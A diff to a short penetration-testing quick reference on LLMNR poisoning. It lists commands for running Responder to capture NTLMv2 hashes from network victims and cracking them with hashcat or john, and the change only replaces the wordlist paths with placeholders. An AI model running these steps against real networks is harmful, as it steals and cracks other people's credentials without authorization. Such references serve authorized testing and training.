@@ -3,8 +3,8 @@ LLMNR POISONING / RESPONDER - QUICK REF
 1.  sudo responder -I <interface>
 2.  Wait for victim to query a non-existent hostname (e.g. mistyped share)
 3.  Hash captured → /usr/share/responder/logs/SMB-NTLMv2-SSP-<victim-ip>.txt
-4a. hashcat -m 5600 <hash-file> /usr/share/wordlists/rockyou.txt --force
-4b. john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt <hash-file>  (no GPU needed)
+4a. hashcat -m 5600 <hash-file> <wordlist-path> --force
+4b. john --format=netntlmv2 --wordlist=<wordlist-path> <hash-file>  (no GPU needed)
 5.  Ctrl+C to stop Responder (no ARP cleanup needed)
 
 [optional] If you set a static IP before the attack, restore with:
